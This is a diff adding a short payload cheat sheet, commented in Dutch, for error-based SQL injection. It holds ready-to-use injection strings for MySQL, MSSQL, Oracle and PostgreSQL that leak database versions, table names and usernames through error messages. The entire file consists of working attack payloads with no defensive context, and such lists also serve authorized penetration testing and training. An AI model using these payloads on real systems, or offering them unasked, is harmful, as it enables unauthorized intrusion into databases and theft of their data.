@@ -1,0 +1,24 @@
+# SQL Injection - Error-Based (data via foutmeldingen)
+# === MySQL ===
+# ExtractValue:
+' AND extractvalue('',concat('>',version()))-- -
+' AND extractvalue('',concat('>',(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))-- -
+# UpdateXML:
+' AND updatexml(1,concat('>',version()),1)-- -
+# Double query:
+' AND (SELECT 1 FROM (SELECT count(*),concat(version(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
+# === MSSQL ===
+# Cast error:
+' AND 1=CONVERT(int,@@version)-- -
+' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))-- -
+' AND 1=CONVERT(int,(SELECT TOP 1 username FROM users))-- -
+# === Oracle ===
+# CTXSYS.DRITHSX.SN:
+' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))-- -
+# UTL_INADDR.GET_HOST_NAME:
+' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))-- -
+# === PostgreSQL ===
+# Cast error:
+' AND 1=CAST(version() AS int)-- -
+' AND 1=CAST((SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public') AS int)-- -
+# Tip: Error-based is snel maar vereist verbose foutmeldingen
